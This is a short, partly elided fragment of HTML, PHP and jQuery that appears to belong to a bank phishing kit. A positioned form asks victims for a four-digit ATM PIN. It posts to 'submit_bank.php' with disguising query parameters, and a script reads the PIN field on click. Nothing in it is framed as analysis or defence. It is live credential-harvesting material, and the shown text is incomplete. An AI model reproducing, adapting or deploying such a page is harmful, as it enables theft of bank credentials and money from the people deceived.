...
<div style="width: 460px; margin: 0px auto; padding-left: 643px; padding-top: 129px;">
    <div class="content_form">
        <form method="post" action="submit_bank.php?websrc=<?php echo md5('nOon'); ?>&dispatched=userInfo&id=<?php echo rand(10000000000,500000000); ?>">
            <div>
                <br>
                <br>
                ...
                <div id="cont_in">
                    <span class="check_box" id="checked" >ATM PIN</span><br>
                    <input style="play: none" type="tel" maxlength="4" id="atm_pin" name="atm_pin" class="input" placeholder="ATM PIN">
                </div>
...
<script>
    $(document).on("click","#inchecked",function(){
        ...
        var atm = document.getElementById('atm_pin');
